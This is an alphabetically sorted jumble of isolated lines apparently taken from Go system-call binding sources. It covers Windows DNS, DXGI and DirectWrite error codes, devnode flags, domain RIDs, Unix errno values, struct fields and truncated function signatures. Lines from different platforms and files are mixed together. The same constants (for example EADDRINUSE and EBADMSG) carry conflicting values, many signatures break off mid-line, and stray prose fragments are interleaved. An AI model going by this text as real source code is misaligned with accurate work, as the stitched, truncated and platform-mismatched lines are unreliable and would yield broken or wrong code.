DNS_ERROR_SOA_DELETE_INVALID                                              syscall.Errno = 9618
DNS_ERROR_STANDBY_KEY_NOT_PRESENT                                         syscall.Errno = 9117
DNS_ERROR_SUBNET_ALREADY_EXISTS                                           syscall.Errno = 9979
DNS_ERROR_SUBNET_DOES_NOT_EXIST                                           syscall.Errno = 9978
DNS_ERROR_TOO_MANY_SKDS                                                   syscall.Errno = 9113
DNS_ERROR_TRY_AGAIN_LATER                                                 syscall.Errno = 9554
DNS_ERROR_UNEXPECTED_CNG_ERROR                                            syscall.Errno = 9110
DNS_ERROR_UNEXPECTED_DATA_PROTECTION_ERROR                                syscall.Errno = 9109
DNS_ERROR_UNKNOWN_RECORD_TYPE                                             syscall.Errno = 9704
DNS_ERROR_UNKNOWN_SIGNING_PARAMETER_VERSION                               syscall.Errno = 9111
DNS_ERROR_UNSECURE_PACKET                                                 syscall.Errno = 9505
DNS_ERROR_UNSUPPORTED_ALGORITHM                                           syscall.Errno = 9105
DNS_ERROR_VIRTUALIZATION_INSTANCE_ALREADY_EXISTS                          syscall.Errno = 9921
DNS_ERROR_VIRTUALIZATION_INSTANCE_DOES_NOT_EXIST                          syscall.Errno = 9922
DNS_ERROR_VIRTUALIZATION_TREE_LOCKED                                      syscall.Errno = 9923
DNS_ERROR_WINS_INIT_FAILED                                                syscall.Errno = 9615
DNS_ERROR_ZONESCOPE_ALREADY_EXISTS                                        syscall.Errno = 9951
DNS_ERROR_ZONESCOPE_DOES_NOT_EXIST                                        syscall.Errno = 9952
DNS_ERROR_ZONESCOPE_FILE_WRITEBACK_FAILED                                 syscall.Errno = 9957
DNS_ERROR_ZONESCOPE_IS_REFERENCED                                         syscall.Errno = 9989
DNS_ERROR_ZONE_ALREADY_EXISTS                                             syscall.Errno = 9609
DNS_ERROR_ZONE_BASE                                                       syscall.Errno = 9600
DNS_ERROR_ZONE_CONFIGURATION_ERROR                                        syscall.Errno = 9604
DNS_ERROR_ZONE_CREATION_FAILED                                            syscall.Errno = 9608
DNS_ERROR_ZONE_DOES_NOT_EXIST                                             syscall.Errno = 9601
DNS_ERROR_ZONE_HAS_NO_NS_RECORDS                                          syscall.Errno = 9606
DNS_ERROR_ZONE_HAS_NO_SOA_RECORD                                          syscall.Errno = 9605
DNS_ERROR_ZONE_IS_SHUTDOWN                                                syscall.Errno = 9621
DNS_ERROR_ZONE_LOCKED                                                     syscall.Errno = 9607
DNS_ERROR_ZONE_LOCKED_FOR_SIGNING                                         syscall.Errno = 9622
DNS_ERROR_ZONE_NOT_SECONDARY                                              syscall.Errno = 9613
DNS_ERROR_ZONE_REQUIRES_MASTER_IP                                         syscall.Errno = 9620
DNS_INFO_ADDED_LOCAL_WINS                                                 syscall.Errno = 9753
DNS_INFO_AXFR_COMPLETE                                                    syscall.Errno = 9751
DNS_INFO_NO_RECORDS                                                       syscall.Errno = 9501
DNS_REQUEST_PENDING                                                       syscall.Errno = 9506
DNS_STATUS_CONTINUE_NEEDED                                                syscall.Errno = 9801
DNS_STATUS_DOTTED_NAME                                                    syscall.Errno = 9558
DNS_STATUS_FQDN                                                           syscall.Errno = 9557
DNS_STATUS_PACKET_UNSECURE                                                              = DNS_ERROR_UNSECURE_PACKET
DNS_STATUS_SINGLE_PART_NAME                                               syscall.Errno = 9559
DNS_TYPE_A       = 0x0001
DNS_TYPE_A6      = 0x0026
DNS_TYPE_AAAA    = 0x001c
DNS_TYPE_ADDRS   = 0x00f8
DNS_TYPE_AFSDB   = 0x0012
DNS_TYPE_ALL     = 0x00ff
DNS_TYPE_ANY     = 0x00ff
DNS_TYPE_ATMA    = 0x0022
DNS_TYPE_AXFR    = 0x00fc
DNS_TYPE_CERT    = 0x0025
DNS_TYPE_CNAME   = 0x0005
DNS_TYPE_DHCID   = 0x0031
DNS_TYPE_DNAME   = 0x0027
DNS_TYPE_DNSKEY  = 0x0030
DNS_TYPE_DS      = 0x002B
DNS_TYPE_EID     = 0x001f
DNS_TYPE_GID     = 0x0066
DNS_TYPE_GPOS    = 0x001b
DNS_TYPE_HINFO   = 0x000d
DNS_TYPE_ISDN    = 0x0014
DNS_TYPE_IXFR    = 0x00fb
DNS_TYPE_KEY     = 0x0019
DNS_TYPE_KX      = 0x0024
DNS_TYPE_LOC     = 0x001d
DNS_TYPE_MAILA   = 0x00fe
DNS_TYPE_MAILB   = 0x00fd
DNS_TYPE_MB      = 0x0007
DNS_TYPE_MD      = 0x0003
DNS_TYPE_MF      = 0x0004
DNS_TYPE_MG      = 0x0008
DNS_TYPE_MINFO   = 0x000e
DNS_TYPE_MR      = 0x0009
DNS_TYPE_MX      = 0x000f
DNS_TYPE_NAPTR   = 0x0023
DNS_TYPE_NBSTAT  = 0xff01
DNS_TYPE_NIMLOC  = 0x0020
DNS_TYPE_NS      = 0x0002
DNS_TYPE_NSAP    = 0x0016
DNS_TYPE_NSAPPTR = 0x0017
DNS_TYPE_NSEC    = 0x002F
DNS_TYPE_NULL    = 0x000a
DNS_TYPE_NXT     = 0x001e
DNS_TYPE_OPT     = 0x0029
DNS_TYPE_PTR     = 0x000c
DNS_TYPE_PX      = 0x001a
DNS_TYPE_RP      = 0x0011
DNS_TYPE_RRSIG   = 0x002E
DNS_TYPE_RT      = 0x0015
DNS_TYPE_SIG     = 0x0018
DNS_TYPE_SINK    = 0x0028
DNS_TYPE_SOA     = 0x0006
DNS_TYPE_SRV     = 0x0021
DNS_TYPE_TEXT    = 0x0010
DNS_TYPE_TKEY    = 0x00f9
DNS_TYPE_TSIG    = 0x00fa
DNS_TYPE_UID     = 0x0065
DNS_TYPE_UINFO   = 0x0064
DNS_TYPE_UNSPEC  = 0x0067
DNS_TYPE_WINS    = 0xff01
DNS_TYPE_WINSR   = 0xff02
DNS_TYPE_WKS     = 0x000b
DNS_TYPE_X25     = 0x0013
DNS_WARNING_DOMAIN_UNDELETED                                              syscall.Errno = 9716
DNS_WARNING_PTR_CREATE_FAILED                                             syscall.Errno = 9715
DN_APM_DRIVER            = 0x10000000        // APM aware driver
DN_APM_ENUMERATOR        = 0x08000000        // APM aware enumerator
DN_ARM_WAKEUP            = 0x04000000        // Devnode can be the wakeup device
DN_BAD_PARTIAL           = 0x00400000        // This devnode's log_confs do not have same resources
DN_BOOT_LOG_PROB         = 0x80000000        // Had a problem during preassignment of boot log conf
DN_CHANGEABLE_FLAGS      = DN_NOT_FIRST_TIME 
DN_CHILD_WITH_INVALID_ID = DN_HAS_MARK       // One or more children have invalid IDs
DN_DEVICE_DISCONNECTED   = DN_NEEDS_LOCKING  // The function driver for a device reported that the device is not connected.  Typically this means a wireless device is out of range.
DN_DISABLEABLE           = 0x00002000        // Can be disabled
DN_DRIVER_BLOCKED        = DN_NOT_FIRST_TIME // One or more drivers are blocked from loading for this Devnode
DN_DRIVER_LOADED         = 0x00000002        // Has Register_Device_Driver
DN_ENUM_LOADED           = 0x00000004        // Has Register_Enumerator
DN_FILTERED              = 0x00000800        // Is filtered
DN_HARDWARE_ENUM         = 0x00000080        // Enum generates hardware ID
DN_HAS_MARK              = 0x00000200        // Not CM_Create_DevInst lately
DN_HAS_PROBLEM           = 0x00000400        // Need device installer
DN_LEGACY_DRIVER         = DN_MOVED          // This device is using a legacy driver
DN_LIAR                  = 0x00000100        // Lied about can reconfig once
DN_MANUAL                = 0x00000010        // Manually installed
DN_MF_CHILD              = 0x00020000        // Multi function child
DN_MF_PARENT             = 0x00010000        // Multi function parent
DN_MOVED                 = 0x00001000        // Has been moved
DN_NEEDS_LOCKING         = 0x02000000        // Devnode need lock resume processing
DN_NEED_RESTART          = DN_LIAR           // System needs to be restarted for this Devnode to work properly
DN_NEED_TO_ENUM          = 0x00000020        // May need reenumeration
DN_NOT_FIRST_TIME        = 0x00000040        // Has received a config
DN_NOT_FIRST_TIMEE       = 0x00080000        // Has received a config enumerate
DN_NO_SHOW_IN_DM         = 0x40000000        // No show in device manager
DN_NT_DRIVER             = 0x01000000        // This devnode's is an NT driver
DN_NT_ENUMERATOR         = 0x00800000        // This devnode's is an NT enumerator
DN_PRIVATE_PROBLEM       = 0x00008000        // Has a private problem
DN_QUERY_REMOVE_ACTIVE   = DN_MF_CHILD       // Device is actively engaged in a query-remove IRP
DN_QUERY_REMOVE_PENDING  = DN_MF_PARENT      // Device is part of a set of related devices collectively pending query-removal
DN_REBAL_CANDIDATE       = 0x00200000        // Don't skip during rebalance
DN_REMOVABLE             = 0x00004000        // Can be removed
DN_ROOT_ENUMERATED       = 0x00000001        // Was enumerated by ROOT
DN_SILENT_INSTALL        = 0x20000000        // Silent install
DN_STARTED               = 0x00000008        // Is currently configured
DN_WILL_BE_REMOVED       = 0x00040000        // DevInst is being removed
DOMAIN_ALIAS_RID_ACCOUNT_OPS                    = 0x224
DOMAIN_ALIAS_RID_ADMINS                         = 0x220
DOMAIN_ALIAS_RID_AUTHORIZATIONACCESS            = 0x230
DOMAIN_ALIAS_RID_BACKUP_OPS                     = 0x227
DOMAIN_ALIAS_RID_CACHEABLE_PRINCIPALS_GROUP     = 0x23b
DOMAIN_ALIAS_RID_CERTSVC_DCOM_ACCESS_GROUP      = 0x23e
DOMAIN_ALIAS_RID_CRYPTO_OPERATORS               = 0x239
DOMAIN_ALIAS_RID_DCOM_USERS                     = 0x232
DOMAIN_ALIAS_RID_EVENT_LOG_READERS_GROUP        = 0x23d
DOMAIN_ALIAS_RID_GUESTS                         = 0x222
DOMAIN_ALIAS_RID_INCOMING_FOREST_TRUST_BUILDERS = 0x22d
DOMAIN_ALIAS_RID_IUSERS                         = 0x238
DOMAIN_ALIAS_RID_LOGGING_USERS                  = 0x22f
DOMAIN_ALIAS_RID_MONITORING_USERS               = 0x22e
DOMAIN_ALIAS_RID_NETWORK_CONFIGURATION_OPS      = 0x22c
DOMAIN_ALIAS_RID_NON_CACHEABLE_PRINCIPALS_GROUP = 0x23c
DOMAIN_ALIAS_RID_POWER_USERS                    = 0x223
DOMAIN_ALIAS_RID_PREW2KCOMPACCESS               = 0x22a
DOMAIN_ALIAS_RID_PRINT_OPS                      = 0x226
DOMAIN_ALIAS_RID_RAS_SERVERS                    = 0x229
DOMAIN_ALIAS_RID_REMOTE_DESKTOP_USERS           = 0x22b
DOMAIN_ALIAS_RID_REPLICATOR                     = 0x228
DOMAIN_ALIAS_RID_SYSTEM_OPS                     = 0x225
DOMAIN_ALIAS_RID_TS_LICENSE_SERVERS             = 0x231
DOMAIN_ALIAS_RID_USERS                          = 0x221
DONT_RESOLVE_DLL_REFERENCES               = 0x1
DRAGDROP_E_ALREADYREGISTERED                                              Handle        = 0x80040101
DRAGDROP_E_CONCURRENT_DRAG_ATTEMPTED                                      Handle        = 0x80040103
DRAGDROP_E_FIRST                                                          syscall.Errno = 0x80040100
DRAGDROP_E_INVALIDHWND                                                    Handle        = 0x80040102
DRAGDROP_E_LAST                                                           syscall.Errno = 0x8004010F
DRAGDROP_E_NOTREGISTERED                                                  Handle        = 0x80040100
DRAGDROP_S_CANCEL                                                         Handle        = 0x00040101
DRAGDROP_S_DROP                                                           Handle        = 0x00040100
DRAGDROP_S_FIRST                                                          syscall.Errno = 0x00040100
DRAGDROP_S_LAST                                                           syscall.Errno = 0x0004010F
DRAGDROP_S_USEDEFAULTCURSORS                                              Handle        = 0x00040102
DRIVE_CDROM       = 5
DRIVE_FIXED       = 3
DRIVE_NO_ROOT_DIR = 1
DRIVE_RAMDISK     = 6
DRIVE_REMOTE      = 4
DRIVE_REMOVABLE   = 2
DRIVE_UNKNOWN     = 0
DS_S_SUCCESS                                                                            = ERROR_SUCCESS
DT_BLK                                      = 0x6
DT_BLK                                  = 0x6
DT_BLK                            = 0x6
DT_BLK                         = 0x6
DT_CHR                                      = 0x2
DT_CHR                                  = 0x2
DT_CHR                            = 0x2
DT_CHR                         = 0x2
DT_DBF                            = 0xf
DT_DIR                                      = 0x4
DT_DIR                                  = 0x4
DT_DIR                            = 0x4
DT_DIR                         = 0x4
DT_FIFO                                     = 0x1
DT_FIFO                                 = 0x1
DT_FIFO                           = 0x1
DT_FIFO                        = 0x1
DT_LNK                                      = 0xa
DT_LNK                                  = 0xa
DT_LNK                            = 0xa
DT_LNK                         = 0xa
DT_REG                                      = 0x8
DT_REG                                  = 0x8
DT_REG                            = 0x8
DT_REG                         = 0x8
DT_SOCK                                     = 0xc
DT_SOCK                                 = 0xc
DT_SOCK                           = 0xc
DT_SOCK                        = 0xc
DT_UNKNOWN                                  = 0x0
DT_UNKNOWN                              = 0x0
DT_UNKNOWN                        = 0x0
DT_UNKNOWN                     = 0x0
DT_WHT                                      = 0xe
DT_WHT                                  = 0xe
DT_WHT                            = 0xe
DT_WHT                         = 0xe
DUPLICATE_CLOSE_SOURCE = 0x00000001
DUPLICATE_SAME_ACCESS  = 0x00000002
DV_E_CLIPFORMAT                                                           Handle        = 0x8004006A
DV_E_DVASPECT                                                             Handle        = 0x8004006B
DV_E_DVTARGETDEVICE                                                       Handle        = 0x80040065
DV_E_DVTARGETDEVICE_SIZE                                                  Handle        = 0x8004006C
DV_E_FORMATETC                                                            Handle        = 0x80040064
DV_E_LINDEX                                                               Handle        = 0x80040068
DV_E_NOIVIEWOBJECT                                                        Handle        = 0x8004006D
DV_E_STATDATA                                                             Handle        = 0x80040067
DV_E_STGMEDIUM                                                            Handle        = 0x80040066
DV_E_TYMED                                                                Handle        = 0x80040069
DWMERR_CATASTROPHIC_FAILURE                                               Handle        = 0x88980702
DWMERR_STATE_TRANSITION_FAILED                                            Handle        = 0x88980700
DWMERR_THEME_FAILED                                                       Handle        = 0x88980701
DWM_E_ADAPTER_NOT_FOUND                                                   Handle        = 0x80263005
DWM_E_COMPOSITIONDISABLED                                                 Handle        = 0x80263001
DWM_E_NOT_QUEUING_PRESENTS                                                Handle        = 0x80263004
DWM_E_NO_REDIRECTION_SURFACE_AVAILABLE                                    Handle        = 0x80263003
DWM_E_REMOTING_NOT_SUPPORTED                                              Handle        = 0x80263002
DWM_E_TEXTURE_TOO_LARGE                                                   Handle        = 0x80263007
DWM_S_GDI_REDIRECTION_SURFACE                                             Handle        = 0x00263005
DWM_S_GDI_REDIRECTION_SURFACE_BLT_VIA_GDI                                 Handle        = 0x00263008
DWRITE_E_ALREADYREGISTERED                                                Handle        = 0x88985006
DWRITE_E_CACHEFORMAT                                                      Handle        = 0x88985007
DWRITE_E_CACHEVERSION                                                     Handle        = 0x88985008
DWRITE_E_DOWNLOADCANCELLED                                                Handle        = 0x8898500E
DWRITE_E_DOWNLOADFAILED                                                   Handle        = 0x8898500F
DWRITE_E_FILEACCESS                                                       Handle        = 0x88985004
DWRITE_E_FILEFORMAT                                                       Handle        = 0x88985000
DWRITE_E_FILENOTFOUND                                                     Handle        = 0x88985003
DWRITE_E_FLOWDIRECTIONCONFLICTS                                           Handle        = 0x8898500B
DWRITE_E_FONTCOLLECTIONOBSOLETE                                           Handle        = 0x88985005
DWRITE_E_NOCOLOR                                                          Handle        = 0x8898500C
DWRITE_E_NOFONT                                                           Handle        = 0x88985002
DWRITE_E_REMOTEFONT                                                       Handle        = 0x8898500D
DWRITE_E_TEXTRENDERERINCOMPATIBLE                                         Handle        = 0x8898500A
DWRITE_E_TOOMANYDOWNLOADS                                                 Handle        = 0x88985010
DWRITE_E_UNEXPECTED                                                       Handle        = 0x88985001
DWRITE_E_UNSUPPORTEDOPERATION                                             Handle        = 0x88985009
DXGI_DDI_ERR_NONEXCLUSIVE                                                 Handle        = 0x887B0003
DXGI_DDI_ERR_UNSUPPORTED                                                  Handle        = 0x887B0002
DXGI_DDI_ERR_WASSTILLDRAWING                                              Handle        = 0x887B0001
DXGI_ERROR_ACCESS_DENIED                                                  Handle        = 0x887A002B
DXGI_ERROR_ACCESS_LOST                                                    Handle        = 0x887A0026
DXGI_ERROR_ALREADY_EXISTS                                                 Handle        = 0x887A0036
DXGI_ERROR_CACHE_CORRUPT                                                  Handle        = 0x887A0033
DXGI_ERROR_CACHE_FULL                                                     Handle        = 0x887A0034
DXGI_ERROR_CACHE_HASH_COLLISION                                           Handle        = 0x887A0035
DXGI_ERROR_CANNOT_PROTECT_CONTENT                                         Handle        = 0x887A002A
DXGI_ERROR_DEVICE_HUNG                                                    Handle        = 0x887A0006
DXGI_ERROR_DEVICE_REMOVED                                                 Handle        = 0x887A0005
DXGI_ERROR_DEVICE_RESET                                                   Handle        = 0x887A0007
DXGI_ERROR_DRIVER_INTERNAL_ERROR                                          Handle        = 0x887A0020
DXGI_ERROR_DYNAMIC_CODE_POLICY_VIOLATION                                  Handle        = 0x887A0031
DXGI_ERROR_FRAME_STATISTICS_DISJOINT                                      Handle        = 0x887A000B
DXGI_ERROR_GRAPHICS_VIDPN_SOURCE_IN_USE                                   Handle        = 0x887A000C
DXGI_ERROR_HW_PROTECTION_OUTOFMEMORY                                      Handle        = 0x887A0030
DXGI_ERROR_INVALID_CALL                                                   Handle        = 0x887A0001
DXGI_ERROR_MODE_CHANGE_IN_PROGRESS                                        Handle        = 0x887A0025
DXGI_ERROR_MORE_DATA                                                      Handle        = 0x887A0003
DXGI_ERROR_NAME_ALREADY_EXISTS                                            Handle        = 0x887A002C
DXGI_ERROR_NONEXCLUSIVE                                                   Handle        = 0x887A0021
DXGI_ERROR_NON_COMPOSITED_UI                                              Handle        = 0x887A0032
DXGI_ERROR_NOT_CURRENT                                                    Handle        = 0x887A002E
DXGI_ERROR_NOT_CURRENTLY_AVAILABLE                                        Handle        = 0x887A0022
DXGI_ERROR_NOT_FOUND                                                      Handle        = 0x887A0002
DXGI_ERROR_REMOTE_CLIENT_DISCONNECTED                                     Handle        = 0x887A0023
DXGI_ERROR_REMOTE_OUTOFMEMORY                                             Handle        = 0x887A0024
DXGI_ERROR_RESTRICT_TO_OUTPUT_STALE                                       Handle        = 0x887A0029
DXGI_ERROR_SDK_COMPONENT_MISSING                                          Handle        = 0x887A002D
DXGI_ERROR_SESSION_DISCONNECTED                                           Handle        = 0x887A0028
DXGI_ERROR_UNSUPPORTED                                                    Handle        = 0x887A0004
DXGI_ERROR_WAIT_TIMEOUT                                                   Handle        = 0x887A0027
DXGI_ERROR_WAS_STILL_DRAWING                                              Handle        = 0x887A000A
DXGI_STATUS_CLIPPED                                                       Handle        = 0x087A0002
DXGI_STATUS_DDA_WAS_STILL_DRAWING                                         Handle        = 0x087A000A
DXGI_STATUS_GRAPHICS_VIDPN_SOURCE_IN_USE                                  Handle        = 0x087A0006
DXGI_STATUS_MODE_CHANGED                                                  Handle        = 0x087A0007
DXGI_STATUS_MODE_CHANGE_IN_PROGRESS                                       Handle        = 0x087A0008
DXGI_STATUS_NO_DESKTOP_ACCESS                                             Handle        = 0x087A0005
DXGI_STATUS_NO_REDIRECTION                                                Handle        = 0x087A0004
DXGI_STATUS_OCCLUDED                                                      Handle        = 0x087A0001
DXGI_STATUS_PRESENT_REQUIRED                                              Handle        = 0x087A002F
DXGI_STATUS_UNOCCLUDED                                                    Handle        = 0x087A0009
DadState           int32
Dar       uint32
Dar       uint64
Darwin 14 vs Darwin 15). This makes it easier to track the progress of changes
Data 
Data    
Data       
Data         [7]byte
Data      IfData
Data      int64
Data     [40]byte
Data    IfData
Data    ifData
Data   [120]uint8
Data   [12]int8
Data   [14]int8
Data   [14]uint8
Data   [244]int8
Data   [24]int8
Data   [46]int8
Data   []byte
Data   int32
Data   int64
Data   uint32
Data   uint64
Data [8]uint32
Data unsafe.Pointer
Data1 uint32
Data2 uint16
Data3 uint16
Data4 [8]byte
DataBlob) (err error) = crypt32.CryptProtectData
DataBlob) (err error) = crypt32.CryptUnprotectData
DataBlob) (err error) {
Data_head      uint64
Data_offset    uint64
Data_size      uint64
Data_size    uint32
Data_start   uint32
Data_tail      uint64
Datalen     uint8
Datalen    uint16
Datalen   uint32
Datalen int32
Datalen uint32
Day          uint16
DayOfWeek    uint16
DaylightBias int32
DaylightDate Systemtime
DaylightName [32]uint16
Ddname       [9]byte
Decompress_cnt  uint64
Decompress_tlen uint64
Decrypt_cnt  uint64
Decrypt_tlen uint64
DefValue            string              // default value (as text)
DefaultHeapID   uintptr
DefaultThreadpoolCpuSetMaskCount uint32
DefaultThreadpoolCpuSetMasks     uintptr
Delay uint32
DeleteFile(path 
DeleteService(service Handle) (err error) = advapi32.DeleteService
DeleteVolumeMountPoint(volumeMountPoint 
DeltaPri       int32
Dependencies     
Deprecated string
DeregisterEventSource(handle Handle) (err error) = advapi32.DeregisterEventSource
Desc     uint64
Descr           [MAXLEN_IFDESCR]byte
DescrLen        uint32
Description 
Description           
Description         [MAX_ADAPTER_DESCRIPTION_LENGTH 
Description  [WSADESCRIPTION_LEN 
Desktop       
Dest_count uint16
Dest_fd       int64
Dest_offset   uint64
Dest_offset uint64
DestinationSAP uint8
DestroyEnvironmentBlock(block 
Dev            int32
Dev          uint32
Dev          uint64
Dev        uint32
Dev      uint32
Dev      uint64
Dev     int32
Dev     uint16
Dev     uint32
Dev     uint64
Dev    string
Dev  uint32 // server subtype
Dev  uint64
Dev:  
DevInfoData) (
DevInfoData) (err error) = setupapi.SetupDiCallClassInstaller
DevInfoData) (err error) = setupapi.SetupDiCreateDeviceInfoW
DevInfoData) (err error) = setupapi.SetupDiEnumDeviceInfo
DevInfoData) (err error) = setupapi.SetupDiGetSelectedDevice
DevInfoData) (err error) = setupapi.SetupDiSetSelectedDevice
DevInfoData) (err error) {
DevInfoData) error {
DevInfoData{}
DevInfoListDetailData) (err error) = setupapi.SetupDiGetDeviceInfoListDetailW
DevInfoListDetailData) (err error) {
DevInfoListDetailData) RemoteMachineName() string {
DevInfoListDetailData) SetRemoteMachineName(remoteMachineName string) error {
DevInfoListDetailData) unsafeSizeOf() uint32 {
DevInfoListDetailData{}
DevInst   DEVINST
DevInstallParams) (err error) = setupapi.SetupDiGetDeviceInstallParamsW
DevInstallParams) (err error) = setupapi.SetupDiSetDeviceInstallParamsW
DevInstallParams) (err error) {
DevInstallParams) DriverPath() string {
DevInstallParams) SetDriverPath(driverPath string) error {
DevInstallParams) error {
DevInstallParams{}
Dev_idx          uint32
Dev_idx      uint32
Dev_major       uint32
Dev_minor       uint32
Device           uint16
Device           uint32
Device           uint64
DeviceIdx      uint32
DeviceIdx   uint32
Devname [64]uint8
Devno uint32
DhcpEnabled         uint32
DhcpServer          IpAddrString
Did you mean this
Digestsize uint32
Dir) Null() { 
Dirent
Dirent) (res Errno)
Dirent) (res Errno) {
Dirent) NameString() string {
DisableAutoGenTag bool
DisableDefaultCmd bool
DisableDescriptions bool
DisableFlagParsing bool
DisableFlagsInUseLine bool
DisableNoDescFlag bool
DisableSuggestions bool
DisplayName      
DisplayName          
DistroID      DistributionID
DistroVersion string
Dlf            uint16
Dll  
DllBase            uintptr
DllPath          NTUnicodeString
Dma_1word      uint16
Dma_mword      uint16
Dma_ultra      uint16
DnsNameCompare(name1 
DnsRecordListFree(rl 
DnsSectionAdditional = 0x0003
DnsSectionAnswer     = 0x0001
DnsSectionAuthority  = 0x0002
DnsSectionQuestion   = 0x0000
DnsSuffix             
Domain         
Domain   uint32
DomainLength   uint32
Domainname [65]byte
DosPath   NTString
DosPath NTUnicodeString
Dp     
Driver       [32]byte
DriverDate    Filetime
DriverType    uint32
DriverVersion uint64
Driver_name [64]int8
Driver_name [64]uint8
Drop    uint64
Drop uint32
Drop uint64
Drops        uint32
Drops   uint32
DrvInfoData) (
DrvInfoData) (err error) = setupapi.SetupDiEnumDriverInfoW
DrvInfoData) (err error) = setupapi.SetupDiGetSelectedDriverW
DrvInfoData) (err error) = setupapi.SetupDiSetSelectedDriverW
DrvInfoData) (err error) {
DrvInfoData) Description() string {
DrvInfoData) MfgName() string {
DrvInfoData) ProviderName() string {
DrvInfoData) SetDescription(description string) error {
DrvInfoData) SetMfgName(mfgName string) error {
DrvInfoData) SetProviderName(providerName string) error {
DrvInfoData) error {
DrvInfoData{}
DrvInfoDetailData) CompatIDs() []string {
DrvInfoDetailData) DrvDescription() string {
DrvInfoDetailData) HardwareID() string {
DrvInfoDetailData) InfFileName() string {
DrvInfoDetailData) IsCompatible(hwid string) bool {
DrvInfoDetailData) SectionName() string {
DrvInfoDetailData) getBuf() []uint16 {
DrvInfoDetailData) unsafeSizeOf() uint32 {
DrvInfoDetailData)(unsafe.Pointer(
Ds       uint64
Ds     uint16
Ds     uint32
Dsap             uint8
Dsisr     uint32
Dsisr     uint64
Dst_len  uint8
Dsttime     int32
Dtime      uint32
Dtime  int64
Dtime_high uint16
Dtime_high uint32
Dummy  int32
Dummy2 
Dummy3 [5]int32
Dummy4 [3]
Duration flags accept any input valid for time.ParseDuration.
Dw       uint32
Dword_io       uint16
E([ABCD]X
E2BIG              = Errno(145)
E2BIG           = syscall.Errno(0x7)
E2BIG       = syscall.Errno(0x7)
EACCES             = Errno(111)
EACCES          = syscall.Errno(0xd)
EACCES      = syscall.Errno(0xd)
EADDRINUSE         = Errno(1115)
EADDRINUSE      = syscall.Errno(0x30)
EADDRINUSE      = syscall.Errno(0x43)
EADDRINUSE      = syscall.Errno(0x62)
EADDRINUSE      = syscall.Errno(0x7d)
EADDRNOTAVAIL      = Errno(1116)
EADDRNOTAVAIL   = syscall.Errno(0x31)
EADDRNOTAVAIL   = syscall.Errno(0x44)
EADDRNOTAVAIL   = syscall.Errno(0x63)
EADDRNOTAVAIL   = syscall.Errno(0x7e)
EADV               = Errno(1145)
EADV            = syscall.Errno(0x44)
EADV            = syscall.Errno(0x53)
EAFNOSUPPORT       = Errno(1114)
EAFNOSUPPORT    = syscall.Errno(0x2f)
EAFNOSUPPORT    = syscall.Errno(0x42)
EAFNOSUPPORT    = syscall.Errno(0x61)
EAFNOSUPPORT    = syscall.Errno(0x7c)
EAGAIN             = Errno(112)
EAGAIN          = syscall.Errno(0x23)
EAGAIN          = syscall.Errno(0xb)
EAGAIN      = syscall.Errno(0xb)
EALREADY           = Errno(1104)
EALREADY        = syscall.Errno(0x25)
EALREADY        = syscall.Errno(0x38)
EALREADY        = syscall.Errno(0x72)
EALREADY        = syscall.Errno(0x95)
EASYNC          = syscall.Errno(0x63)
EAS_E_ADMINS_CANNOT_CHANGE_PASSWORD                                       Handle        = 0x80550008
EAS_E_ADMINS_HAVE_BLANK_PASSWORD                                          Handle        = 0x80550007
EAS_E_CONNECTED_ADMINS_NEED_TO_CHANGE_PASSWORD                            Handle        = 0x8055000B
EAS_E_CURRENT_CONNECTED_USER_NEED_TO_CHANGE_PASSWORD                      Handle        = 0x8055000D
EAS_E_CURRENT_USER_HAS_BLANK_PASSWORD                                     Handle        = 0x80550004
EAS_E_LOCAL_CONTROLLED_USERS_CANNOT_CHANGE_PASSWORD                       Handle        = 0x80550009
EAS_E_PASSWORD_POLICY_NOT_ENFORCEABLE_FOR_CONNECTED_ADMINS                Handle        = 0x8055000A
EAS_E_PASSWORD_POLICY_NOT_ENFORCEABLE_FOR_CURRENT_CONNECTED_USER          Handle        = 0x8055000C
EAS_E_POLICY_COMPLIANT_WITH_ACTIONS                                       Handle        = 0x80550002
EAS_E_POLICY_NOT_MANAGED_BY_OS                                            Handle        = 0x80550001
EAS_E_REQUESTED_POLICY_NOT_ENFORCEABLE                                    Handle        = 0x80550003
EAS_E_REQUESTED_POLICY_PASSWORD_EXPIRATION_INCOMPATIBLE                   Handle        = 0x80550005
EAS_E_USER_CANNOT_CHANGE_PASSWORD                                         Handle        = 0x80550006
EAUTH           = syscall.Errno(0x50)
EBADARCH        = syscall.Errno(0x56)
EBADDATA           = Errno(245)
EBADE           = syscall.Errno(0x32)
EBADE           = syscall.Errno(0x34)
EBADE           = syscall.Errno(0x66)
EBADEXEC        = syscall.Errno(0x55)
EBADF              = Errno(113)
EBADF           = syscall.Errno(0x9)
EBADF       = syscall.Errno(0x9)
EBADFD          = syscall.Errno(0x4d)
EBADFD          = syscall.Errno(0x51)
EBADFD          = syscall.Errno(0x5d)
EBADMACHO       = syscall.Errno(0x58)
EBADMSG            = Errno(1140)
EBADMSG         = syscall.Errno(0x4a)
EBADMSG         = syscall.Errno(0x4c)
EBADMSG         = syscall.Errno(0x4d)
EBADMSG         = syscall.Errno(0x58)
EBADMSG         = syscall.Errno(0x59)
EBADMSG         = syscall.Errno(0x5c)
EBADMSG         = syscall.Errno(0x5e)
EBADMSG         = syscall.Errno(0x78)
EBADNAME           = Errno(248)
EBADR           = syscall.Errno(0x33)
EBADR           = syscall.Errno(0x35)
EBADR           = syscall.Errno(0x67)
EBADRPC         = syscall.Errno(0x48)
EBADRQC         = syscall.Errno(0x36)
EBADRQC         = syscall.Errno(0x38)
EBADRQC         = syscall.Errno(0x6a)
EBADSLT         = syscall.Errno(0x37)
EBADSLT         = syscall.Errno(0x39)
EBADSLT         = syscall.Errno(0x6b)
EBFONT          = syscall.Errno(0x39)
EBFONT          = syscall.Errno(0x3b)
EBFONT          = syscall.Errno(0x6d)
EBUFLEN            = Errno(227)
EBUSY              = Errno(114)
EBUSY           = syscall.Errno(0x10)
EBUSY       = syscall.Errno(0x10)
ECALL
ECANCELED          = Errno(1152)
ECANCELED       = syscall.Errno(0x2f)
ECANCELED       = syscall.Errno(0x55)
ECANCELED       = syscall.Errno(0x57)
ECANCELED       = syscall.Errno(0x58)
ECANCELED       = syscall.Errno(0x59)
ECANCELED       = syscall.Errno(0x75)
ECANCELED       = syscall.Errno(0x7d)
ECANCELED       = syscall.Errno(0x7f)
ECANCELED       = syscall.Errno(0x9e)
ECAPMODE        = syscall.Errno(0x5e)
ECCAPBITS/ 
ECCGETLAYOUT                     = 0x41484d11
ECCGETLAYOUT                     = 0x81484d11
ECCGETSTATS                      = 0x40104d12
ECCGETSTATS                      = 0x80104d12
ECHILD             = Errno(115)
ECHILD          = syscall.Errno(0xa)
ECHILD      = syscall.Errno(0xa)
ECHO                                        = 0x8
